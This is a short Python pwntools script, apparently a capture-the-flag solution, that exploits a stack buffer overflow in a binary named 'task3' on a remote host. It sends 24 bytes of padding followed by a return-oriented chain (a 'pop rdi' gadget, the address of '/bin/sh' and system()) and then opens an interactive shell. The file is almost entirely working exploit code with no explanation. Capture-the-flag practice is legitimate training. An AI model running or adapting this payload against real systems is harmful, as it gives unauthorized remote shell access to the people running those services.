#!/usr/bin/env python3

from os import system
from pwngun_craft import craft
from pwn import *

# SETTINGS

BINARY = "task3"

IP = "92.53.104.174"
PORT = 37005

LINK_LIBC = False
LIBC = ""
LD = ""
GDBSCRIPT = """
"""

LOG_LEVEL = "DEBUG"

r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL)

# SPLOIT #

pop_rdi = p64(0x0000000000401303)   # pop rdi; ret;
system = p64(0x401090)
binsh = p64(0x404050)

r.send(b'A' * 24 + pop_rdi + binsh + system)

r.interactive()
